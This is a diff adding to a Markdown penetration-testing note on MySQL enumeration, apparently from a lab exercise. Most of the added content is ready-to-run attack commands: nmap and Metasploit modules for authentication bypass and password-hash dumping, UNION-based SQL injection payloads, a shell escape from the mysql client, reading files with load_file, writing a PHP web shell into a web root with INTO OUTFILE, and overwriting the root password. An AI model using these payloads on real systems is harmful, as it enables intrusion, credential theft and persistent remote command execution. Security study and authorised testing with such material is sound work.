@@ -10,15 +10,51 @@ sudo apt install default-mysql-client
 ```
 
 ## Manual enumeration:
-1. Scanning with nmap:
+>Scanning with nmap:
+```sh
+nmap -sT -A 10.10.19.225
+```
+
 ![[MySQL1.png]]
 
-2. Manually connecting to MySQL server:
+### Connect
+
+#### Local
+```sh
+mysql -u root # Connect to root without password
+mysql -u root -p # A password will be asked (check someone)
+```
+
+#### Remote
+```sh
+mysql -h <Hostname> -u root
+mysql -h <Hostname> -u root@localhost
+```
+
+**Example** - 
+```sh
+mysql -h 10.10.19.225 -u root -p
+```
    ![[MySQL2.png]]
    We had used above credentials(root:password) for login purpose and now we exit from this session with "exit" command.
 
-3. Finding the username with nmap script:
+>Finding the username with nmap script:
+```sh
+nmap -p 3306 --script=mysql-enum 10.10.19.225
+```
    ![[MySQL3.png]]
+
+### External Enumeration
+>Some of the enumeration actions require valid credentials
+```sh
+nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>
+msf> use auxiliary/scanner/mysql/mysql_version
+msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
+msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
+msf> use auxiliary/admin/mysql/mysql_enum #Creds
+msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds 
+msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
+```
 
 
 ## Metasploit enumeration:
@@ -61,3 +97,73 @@ msf6 auxiliary(scanner/mysql/mysql_hashdump) > run
 
 ```
 Now, we can crack the hash with john the ripper and login with ssh. 
+
+### [**Brute force**](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#mysql)
+>Write any binary data
+```sh
+CONVERT(unhex("6f6e2e786d6c55540900037748b75c7249b75"), BINARY)
+CONVERT(from_base64("aG9sYWFhCg=="), BINARY)
+```
+
+### MySQL commands
+```sh
+show databases;
+use <database>;
+connect <database>;
+show tables;
+describe <table_name>;
+show columns from <table>;
+
+select version(); #version
+select @@version(); #version
+select user(); #User
+select database(); #database name
+
+#Get a shell with the mysql client user
+\! sh
+
+#Basic MySQLi
+Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
+Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"
+
+#Read & Write
+## Yo need FILE privilege to read & write to files.
+select load_file('/var/lib/mysql-files/key.txt'); #Read file
+select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'
+
+#Try to change MySQL root password
+UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
+UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
+FLUSH PRIVILEGES;
+quit;
+```
+
+```sh
+mysql -u username -p < manycommands.sql #A file with all the commands you want to execute
+mysql -u root -h 127.0.0.1 -e 'show databases;'
+```
+
+### MySQL Permissions Enumeration
+```sh
+#Mysql
+SHOW GRANTS [FOR user];
+SHOW GRANTS;
+SHOW GRANTS FOR 'root'@'localhost';
+SHOW GRANTS FOR CURRENT_USER();
+
+# Get users, permissions & hashes
+SELECT * FROM mysql.user;
+
+#From DB
+select * from mysql.user where user='root'; 
+## Get users with file_priv
+select user,file_priv from mysql.user where file_priv='Y';
+## Get users with Super_priv
+select user,Super_priv from mysql.user where Super_priv='Y';
+
+# List functions
+SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION';
+#@ Functions not from sys. db
+SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' AND routine_schema!='sys';
+```
+
